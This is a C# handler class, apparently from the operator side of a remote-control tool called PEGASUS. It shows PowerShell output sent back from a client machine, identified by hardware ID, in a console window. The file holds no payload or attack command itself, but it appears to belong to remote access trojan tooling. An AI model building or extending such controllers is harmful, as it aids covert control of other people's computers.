using System.Windows.Forms;
using PEGASUS.Design;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;

namespace PEGASUS.BytesInOut
{
	public class HandlePowerShell
	{
		public HandlePowerShell(MsgPack unpack_msgpack, Clients client)
		{
			FormPowerShell formPowerShell = (FormPowerShell)Application.OpenForms["powershell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formPowerShell != null)
			{
				if (formPowerShell.Client == null)
				{
					formPowerShell.Client = client;
					formPowerShell.timer1.Enabled = true;
				}
				formPowerShell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
				formPowerShell.richTextBox1.SelectionStart = formPowerShell.richTextBox1.TextLength;
				formPowerShell.richTextBox1.ScrollToCaret();
			}
		}
	}
}
